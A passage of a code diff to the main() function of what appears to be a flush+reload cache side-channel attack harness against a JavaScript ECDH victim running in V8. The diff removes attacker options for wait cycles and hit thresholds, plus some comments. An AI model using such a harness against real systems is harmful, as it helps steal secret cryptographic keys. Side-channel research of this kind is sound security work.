-				 * the oracle back under two switches that can disagree. */
-				log_error("-debug is gone -- the victim's ground truth now "
-				          "follows `let debug = 1;` in <source.js>, which "
-				          "evaluation/run_ecdh_ct.sh generates for you with "
-				          "BITS=1.");
-				argv_ok = false;
-			} else if (strncmp(argv[i], "-cl", 3) == 0 &&
-			           isdigit((unsigned char)argv[i][3]) &&
-			           argv[i][4] == '=') {
-				if (!parse_target_line(argv[i][3] - '0', argv[i] + 5)) {
-					argv_ok = false;
-				}
-			} else if (strncmp(argv[i], "-wait=", 6) == 0) {
-				fr_wait_cycles = strtoull(argv[i] + 6, nullptr, 0);
-			} else if (strncmp(argv[i], "-thresh=", 8) == 0) {
-				fr_hit_thresh = (i64)strtoll(argv[i] + 8, nullptr, 0);
 			} else if (strncmp(argv[i], "-runs=", 6) == 0) {
 				victim_runs = atoi(argv[i] + 6);
 			} else if (strncmp(argv[i], "-warmup=", 8) == 0) {
@@ -1432,11 +1153,7 @@ int main(int argc, char *argv[]) {
 	if (!argv_ok) {
 		return 1;
 	}
-	/* Positional paths: <source.js> <repeat.js> <key_path>. In CSI mode any that
-	 * are omitted default to the canonical files under the project root (found by
-	 * walking up to the .project marker), so `-csi` alone runs from any directory
-	 * without spelling the three paths out. The seed key only has to be a valid
-	 * scalar for warmup -- CSI overrides s1 with each probe key anyway. */
+
 	char def_src[512], def_rep[512], def_key[512];
 	const char *src_path = argc > 1 ? argv[1] : nullptr;
 	const char *rep_path = argc > 2 ? argv[2] : nullptr;
@@ -1471,10 +1188,7 @@ int main(int argc, char *argv[]) {
 	}
 	source_str = read_file(src_path);
 	repeat_str = read_file(rep_path);
-	/* Name the file, and say so when it looks like a mistyped flag: anything
-	 * the option loop above did not recognise is kept and lands in a path slot,
-	 * so a mistyped attacker flag or a V8 flag placed before the paths fails
-	 * here rather than where the mistake was. */
+
 	const char *paths[2] = { src_path, rep_path };
 	for (int i = 0; i < 2; ++i) {
 		const char *s = i == 0 ? source_str : repeat_str;
